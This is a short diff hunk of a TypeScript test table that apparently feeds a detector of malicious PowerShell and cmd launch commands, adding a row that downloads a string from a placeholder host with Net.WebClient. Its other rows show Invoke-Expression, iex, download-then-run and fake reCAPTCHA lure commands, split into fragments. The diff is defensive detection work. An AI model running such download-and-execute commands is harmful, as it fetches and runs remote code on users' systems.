@@ -251,6 +251,7 @@ const PORTED: readonly [string, 'high' | 'medium', string][] = [
   ['powershell-launch-exec', 'high', x(PSH, ` -c "Invoke-Ex`, `pression 'Write-Output test'"`)],
   ['powershell-launch-exec', 'high', x(PSH, ` -c "ie`, `x('Write-Output test')"`)],
   ['powershell-launch-exec', 'high', x(PSH, ' -c "Invoke-Web', 'Request https://example.invalid/a -UseBasicParsing"')],
+  ['powershell-launch-exec', 'high', x(PSH, ' -c "(New-Object Net.WebClient).Download', `String('https://example.invalid/a')"`)],
   ['powershell-irm-relaunch', 'high', x(PSH, ' -c "ir', 'm https://example.invalid/a.txt -OutFile a.ps1; ', PSH, ' -File a.ps1"')],
   ['cmd-nop-iex', 'high', x(CMD, ' /c %p% -no', 'p -c ie', 'x $t')],
   ['launcher-recaptcha', 'high', x(CMD, ' /c echo test re', 'CAPTCHA')],
